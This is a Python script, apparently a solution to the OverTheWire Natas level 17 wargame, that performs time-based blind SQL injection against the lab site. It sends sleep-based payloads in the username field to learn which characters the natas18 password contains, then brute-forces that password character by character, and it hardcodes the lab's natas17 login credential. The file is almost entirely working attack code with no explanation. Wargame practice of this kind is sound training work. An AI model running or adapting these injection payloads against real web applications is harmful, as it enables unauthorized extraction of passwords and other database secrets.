#!/bin/python3.9
# natas sqli to brute force passwords

import requests
import re
from requests.auth import HTTPBasicAuth 


url = "http://natas17.natas.labs.overthewire.org"
headers = {'content-type': 'application/x-www-form-urlencoded'}
username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'



def authorization_test():
    get_auth = requests.get(url, auth=(username,password))

    s = '<h1>Unauthorized'
    response_check = re.search(s, get_auth.text)
    #print(response_check)
    
    if (str(response_check) != 'None'): 
        print('Authorization failed. Username, password, or url incorrect')
        exit()
    else:
        print('Authentication successful, continuing with exploit.')


def password_character_filter(characters):
    filtered = ''
    print("Filtering characters used in password.")
    for j in characters:
        uri = ''.join([url,'/index.php'])
        payload = f'username=natas18%22+and+password+like+binary+%27%25{j}%25%27+and+sleep%282%29+%23'
        r = requests.post(uri, auth=(username,password), data=payload, headers=headers)
        response_time = r.elapsed.seconds

        if (response_time >= 2): 
            filtered += j
    print(f'List: {filtered}')
    return filtered


def password_brute_force(filtered_characters):
    natas18_password = ''
    print("\nBrute forcing the password.\n")
    for i in range(0,32):
        for j in filtered_characters:
            char = ''.join([natas18_password,j])
            uri = ''.join([url,'/index.php'])
            payload = f'username=natas18%22+and+password+like+binary+%27{char}%25%27+and+sleep%285%29+%23'
            r = requests.post(uri, auth=(username,password), data=payload, headers=headers)
            response_time = r.elapsed.seconds

            if (response_time >= 5): 
                natas18_password += j
                print(f'Length: {len(natas18_password)}, Password: {natas18_password}')
                break
        


            

if __name__ == '__main__':
    #authorization_test()
    filtered_characters = password_character_filter(characters)
    password_brute_force(filtered_characters)